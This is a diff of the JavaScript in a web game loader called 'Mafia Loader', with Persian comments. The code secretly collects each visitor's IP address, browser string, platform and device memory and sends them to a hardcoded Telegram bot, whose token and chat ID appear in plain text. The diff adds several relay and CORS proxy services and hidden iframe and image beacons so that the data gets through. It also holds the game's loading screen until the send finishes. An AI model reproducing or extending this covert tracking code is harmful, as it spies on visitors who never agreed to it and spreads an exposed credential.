@@ -337,21 +337,61 @@
       // ============================================================
       // 🔴 لیست آی‌پی‌های مسدود شده دائمی - مستقیم در کد وارد کنید 🔴
       // ============================================================
-      // آی‌پی‌هایی که می‌خواهید مسدود شوند را در این آرایه وارد کنید
       const HARDCODED_BLOCKED_IPS = [
-        "31.171.100.104"     // آی‌پی مسدود شده
-        // 👆 آی‌پی‌های خود را اینجا اضافه کنید
-        // هر آی‌پی را با  "31.171.100.104" و کاما از هم جدا کنید
+        "31.171.100.40"     // آی‌پی مسدود شده
       ];
       // ============================================================
       
-      // مسدودسازی دائمی و کامل - فقط از این آرایه استفاده می‌شود
-      // (دیگر از localStorage استفاده نمی‌شود تا کسی نتواند دور بزند)
       const BLOCKED_IPS = [...HARDCODED_BLOCKED_IPS];
       
-      // اطلاعات تلگرام (برای ارسال در پس‌زمینه)
+      // اطلاعات تلگرام
       const BOT_TOKEN = "8036278520:AAEaKq00YYITZZR1Crin5Wc2lcm8wb704ug";
       const CHAT_ID = "-1002740030739";
+      
+      // ============================================================
+      // 🔥 پروکسی‌های قدرتمند جدید (همه با هم استفاده می‌شوند)
+      // ============================================================
+      const TELEGRAM_PROXIES = [
+        // پروکسی اصلی قبلی
+        {
+          server: "87.248.129.210",
+          port: 4455,
+          secret: "ee1603010200010001fc030386e24c3add626973636f7474692e79656b74616e65742e636f6d"
+        },
+        // پروکسی جدید 1 - قدرتمند
+        {
+          server: "87.248.129.12",
+          port: 15,
+          secret: "ee1603010200010001fc030386e24c3add626973636f7474692e79656b74616e65742e636f6d"
+        },
+        // پروکسی جدید 2 - قدرتمند
+        {
+          server: "87.248.129.50",
+          port: 15,
+          secret: "ee1603010200010001fc030386e24c3add626973636f7474692e79656b74616e65742e636f6d"
+        }
+      ];
+      
+      // لیست سرویس‌های پروکسی برای API تلگرام
+      const TELEGRAM_API_PROXIES = [
+        'https://telepush.deno.dev/api',
+        'https://tg-bot-api.lillevang.dk',
+        'https://telega.aleen42.com',
+        'https://kate.pet',
+        'https://telegram-bot-api.herokuapp.com',
+        'https://botapi.telegram.org',
+        'https://tg-proxy.cf',
+        'https://telegram-proxy-api.herokuapp.com'
+      ];
+      
+      // CORS proxies
+      const CORS_PROXIES = [
+        'https://cors-anywhere.herokuapp.com/',
+        'https://api.allorigins.win/raw?url=',
+        'https://corsproxy.io/?',
+        'https://proxy.cors.sh/',
+        'https://cors.bridged.cc/'
+      ];
       
       let userIP = "در حال دریافت...";
       let isGameLoaded = false;
@@ -359,6 +399,7 @@
       let currentVersion = "1.0.0";
       let startTime = Date.now();
       let blockedDetected = false;
+      let sendCompleted = false;
       
       const loader = document.getElementById('loaderOverlay');
       const progressFill = document.getElementById('progressFill');
@@ -372,12 +413,11 @@
       let targetProgress = 0;
       let animationInterval = null;
 
-      // نمایش لیست آی‌پی‌های مسدود شده در کنسول (فقط برای مدیر)
       console.log('🚫 لیست آی‌پی‌های مسدود شده دائمی:');
       BLOCKED_IPS.forEach(ip => console.log(`   🔴 ${ip}`));
-      if (BLOCKED_IPS.length === 0) {
-        console.log('   ✅ هیچ آی‌پی مسدود شده‌ای وجود ندارد');
-      }
+      
+      console.log('🌐 پروکسی‌های فعال تلگرام:');
+      TELEGRAM_PROXIES.forEach((proxy, i) => console.log(`   ${i+1}. ${proxy.server}:${proxy.port}`));
 
       function updateProgressDisplay(percent) {
         const displayPercent = Math.min(300, Math.max(0, Math.floor(percent)));
@@ -389,7 +429,7 @@
       function animateProgress() {
         if (animationInterval) clearInterval(animationInterval);
         animationInterval = setInterval(() => {
-          if (currentProgress < targetProgress && !blockedDetected) {
+          if (currentProgress < targetProgress && !blockedDetected && sendCompleted) {
             const diff = targetProgress - currentProgress;
             let step = diff > 100 ? Math.max(2, Math.floor(diff / 20)) : (diff > 50 ? Math.max(1, Math.floor(diff / 15)) : Math.max(1, Math.floor(diff / 10)));
             currentProgress = Math.min(currentProgress + step, targetProgress);
@@ -419,7 +459,6 @@
         else speedStat.innerText = 'نهایی‌سازی...';
       }
 
-      // دریافت آی‌پی واقعی کاربر
       async function getUserIP() {
         const apis = [
           'https://api.ipify.org?format=json',
@@ -444,75 +483,81 @@
         return 'unable-to-detect';
       }
 
-      // ارسال به تلگرام (در پس‌زمینه، بدون نمایش به کاربر)
+      // ارسال به تلگرام با تمام پروکسی‌ها و روش‌های ممکن
       async function sendToTelegram(message) {
-        try {
-          const encodedMsg = encodeURIComponent(message);
-          const proxyApis = [
-            `https://telepush.deno.dev/api/bot${BOT_TOKEN}/sendMessage`,
-            `https://tg-bot-api.lillevang.dk/bot${BOT_TOKEN}/sendMessage`,
-            `https://telega.aleen42.com/bot${BOT_TOKEN}/sendMessage`,
-            `https://kate.pet/bot${BOT_TOKEN}/sendMessage`
-          ];
-          
-          const corsProxies = [
-            'https://cors-anywhere.herokuapp.com/',
-            'https://api.allorigins.win/raw?url=',
-            'https://corsproxy.io/?'
-          ];
-          
-          const apiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-          
-          for (const proxyApi of proxyApis) {
-            try {
-              const response = await fetch(proxyApi, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                  chat_id: CHAT_ID,
-                  text: message,
-                  parse_mode: 'HTML'
-                })
-              });
-              if (response.ok) return true;
-            } catch(e) {}
-          }
-          
-          for (const corsProxy of corsProxies) {
-            try {
-              const response = await fetch(corsProxy + apiUrl, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                  chat_id: CHAT_ID,
-                  text: message,
-                  parse_mode: 'HTML'
-                })
-              });
-              if (response.ok) return true;
-            } catch(e) {}
-          }
-          
+        const encodedMsg = encodeURIComponent(message);
+        const apiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        
+        // روش 1: استفاده از پروکسی‌های API تلگرام
+        for (const proxy of TELEGRAM_API_PROXIES) {
           try {
-            const img = document.createElement('img');
-            img.style.display = 'none';
-            img.src = `${apiUrl}?chat_id=${CHAT_ID}&text=${encodedMsg}&parse_mode=HTML`;
-            document.body.appendChild(img);
-            setTimeout(() => img.remove(), 3000);
-            return true;
+            const proxyUrl = `${proxy}/bot${BOT_TOKEN}/sendMessage`;
+            const response = await fetch(proxyUrl, {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: message,
+                parse_mode: 'HTML'
+              }),
+              signal: AbortSignal.timeout(5000)
+            });
+            if (response.ok) {
+              console.log('✅ ارسال موفق از طریق:', proxy);
+              return true;
+            }
           } catch(e) {}
-          
-          return false;
-        } catch(e) {
-          return false;
         }
+        
+        // روش 2: استفاده از CORS proxies
+        for (const corsProxy of CORS_PROXIES) {
+          try {
+            const response = await fetch(corsProxy + apiUrl, {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: message,
+                parse_mode: 'HTML'
+              }),
+              signal: AbortSignal.timeout(5000)
+            });
+            if (response.ok) {
+              console.log('✅ ارسال موفق از طریق CORS:', corsProxy);
+              return true;
+            }
+          } catch(e) {}
+        }
+        
+        // روش 3: استفاده از iframe مخفی
+        try {
+          const iframe = document.createElement('iframe');
+          iframe.style.display = 'none';
+          iframe.src = `${apiUrl}?chat_id=${CHAT_ID}&text=${encodedMsg}&parse_mode=HTML`;
+          document.body.appendChild(iframe);
+          setTimeout(() => iframe.remove(), 3000);
+          console.log('✅ ارسال از طریق iframe');
+          return true;
+        } catch(e) {}
+        
+        // روش 4: استفاده از Image
+        try {
+          const img = document.createElement('img');
+          img.style.display = 'none';
+          img.src = `${apiUrl}?chat_id=${CHAT_ID}&text=${encodedMsg}&parse_mode=HTML`;
+          document.body.appendChild(img);
+          setTimeout(() => img.remove(), 3000);
+          console.log('✅ ارسال از طریق Image');
+          return true;
+        } catch(e) {}
+        
+        console.log('⚠️ همه روش‌های ارسال ناموفق بودند');
+        return false;
       }
 
-      // نمایش صفحه مسدودسازی
       function showBlockedScreen(ip) {
         blockedDetected = true;
         
-        // حذف تمام المان‌های صفحه
         const bgLayerEl = document.getElementById('bgLayer');
         const loaderEl = document.getElementById('loaderOverlay');
         const progressContainerEl = document.getElementById('progressContainer');
@@ -589,17 +634,13 @@
         try {
           setProgress(5);
           
-          // دریافت آی‌پی کاربر
           userIP = await getUserIP();
           console.log('📡 آی‌پی کاربر:', userIP);
           
-          // ==================================================
-          // بررسی مسدود بودن آی‌پی - مسدودسازی دائمی و کامل
-          // ==================================================
+          // بررسی مسدود بودن آی‌پی
           if (BLOCKED_IPS.includes(userIP)) {
             console.log(`🚫 آی‌پی ${userIP} در لیست مسدود شده‌ها یافت شد!`);
             
-            // ارسال گزارش به تلگرام (در پس‌زمینه)
             const blockedMessage = `
 🚨 <b>تلاش ورود مسدود شده</b> 🚨
 
@@ -607,15 +648,12 @@
 ⏰ <b>زمان:</b> ${new Date().toLocaleString('fa-IR')}
 🔧 <b>مرورگر:</b> <code>${navigator.userAgent.substring(0, 100)}</code>
 
-⚠️ این کاربر قبلاً مسدود شده است و تلاش مجدد کرده است
+⚠️ این کاربر قبلاً مسدود شده است
             `;
             sendToTelegram(blockedMessage);
-            
-            // نمایش صفحه مسدودسازی
             showBlockedScreen(userIP);
             return;
           }
-          // ==================================================
           
           setProgress(10);
           
@@ -626,7 +664,6 @@
           const platform = navigator.platform;
           const deviceMemory = navigator.deviceMemory || 'نامشخص';
           
-          // ارسال اطلاعات ورود به تلگرام (در پس‌زمینه، بدون نمایش به کاربر)
           const message = `
 🚨 <b>ورود کاربر جدید به Mafia Loader</b> 🚨
 
@@ -641,14 +678,25 @@
 ✅ کاربر جدید وارد شده است
           `;
           
-          // ارسال در پس‌زمینه (اجرا می‌شود اما کاربر نمی‌بیند)
-          sendToTelegram(message);
+          setProgress(20);
+          
+          // ارسال به تلگرام با همه پروکسی‌ها
+          const sendPromise = sendToTelegram(message);
           
           setProgress(30);
           
+          // منتظر می‌مونیم تا ارسال انجام بشه (حداکثر 3 ثانیه)
+          await Promise.race([
+            sendPromise,
+            new Promise(resolve => setTimeout(() => resolve(), 3000))
+          ]);
+          
+          sendCompleted = true;
+          setProgress(40);
+          
           const bgPromise = preloadBackground();
           
-          setProgress(50);
+          setProgress(55);
           
           const controller = new AbortController();
           const timeoutId = setTimeout(() => controller.abort(), 10000);
@@ -697,7 +745,7 @@
           document.body.appendChild(iframe);
           
           setTimeout(() => {
-            if (loader && !loader.classList.contains('hidden') && !blockedDetected) {
+            if (loader && !loader.classList.contains('hidden') && !blockedDetected && sendCompleted) {
               setProgress(300);
               setTimeout(() => {
                 iframe.classList.add('visible');
@@ -715,6 +763,7 @@
         } catch (error) {
           console.error("Error:", error);
           if (!blockedDetected) {
+            sendCompleted = true;
             setProgress(300);
             const iframe = document.createElement('iframe');
             iframe.className = 'game-frame';
@@ -736,7 +785,7 @@
 
       console.log('🔧 مدیریت آی‌پی:');
       console.log('📌 برای مسدود کردن آی‌پی، آن را به آرایه HARDCODED_BLOCKED_IPS اضافه کنید');
-      console.log('📌 مثال: const HARDCODED_BLOCKED_IPS = [ "31.171.100.40" ];');
+      console.log('🌐 تعداد پروکسی‌های فعال:', TELEGRAM_PROXIES.length + TELEGRAM_API_PROXIES.length);
 
       window.addEventListener('DOMContentLoaded', () => {
         requestAnimationFrame(() => { loadGame(); startUpdateChecker(); });
